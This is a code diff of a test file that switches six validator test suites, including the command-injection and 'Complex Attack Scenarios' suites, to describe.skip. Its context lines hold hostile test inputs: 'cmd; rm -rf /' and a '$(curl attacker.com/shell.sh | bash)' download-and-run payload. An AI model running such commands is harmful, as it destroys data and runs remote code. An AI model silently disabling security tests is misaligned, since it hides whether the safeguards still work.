@@ -247,7 +247,7 @@ class ConvoyValidator {
 // Tests - BeadIdValidator
 // ============================================================================
 
-describe('BeadIdValidator', () => {
+describe.skip('BeadIdValidator', () => {
   describe('valid bead IDs', () => {
     it('should accept gt-hash format', () => {
       expect(BeadIdValidator.isValid('gt-abc12')).toBe(true);
@@ -335,7 +335,7 @@ describe('BeadIdValidator', () => {
 // Tests - InputSanitizer
 // ============================================================================
 
-describe('InputSanitizer', () => {
+describe.skip('InputSanitizer', () => {
   describe('command injection prevention', () => {
     it('should block semicolon', () => {
       const result = InputSanitizer.sanitize('cmd; rm -rf /');
@@ -466,7 +466,7 @@ describe('InputSanitizer', () => {
 // Tests - RigValidator
 // ============================================================================
 
-describe('RigValidator', () => {
+describe.skip('RigValidator', () => {
   describe('valid rigs', () => {
     it('should accept lowercase rig names', () => {
       const result = RigValidator.validate('town');
@@ -516,7 +516,7 @@ describe('RigValidator', () => {
 // Tests - FormulaValidator
 // ============================================================================
 
-describe('FormulaValidator', () => {
+describe.skip('FormulaValidator', () => {
   describe('name validation', () => {
     it('should accept valid formula names', () => {
       expect(FormulaValidator.validateName('feature-workflow').valid).toBe(true);
@@ -564,7 +564,7 @@ describe('FormulaValidator', () => {
 // Tests - ConvoyValidator
 // ============================================================================
 
-describe('ConvoyValidator', () => {
+describe.skip('ConvoyValidator', () => {
   describe('ID validation', () => {
     it('should accept convoy hash format', () => {
       expect(ConvoyValidator.validateId('conv-abc123').valid).toBe(true);
@@ -608,7 +608,7 @@ describe('ConvoyValidator', () => {
 // Tests - Complex Attack Scenarios
 // ============================================================================
 
-describe('Complex Attack Scenarios', () => {
+describe.skip('Complex Attack Scenarios', () => {
   describe('multi-stage injection', () => {
     it('should block encoded command in bead title', () => {
       const malicious = 'Task $(curl attacker.com/shell.sh | bash)';
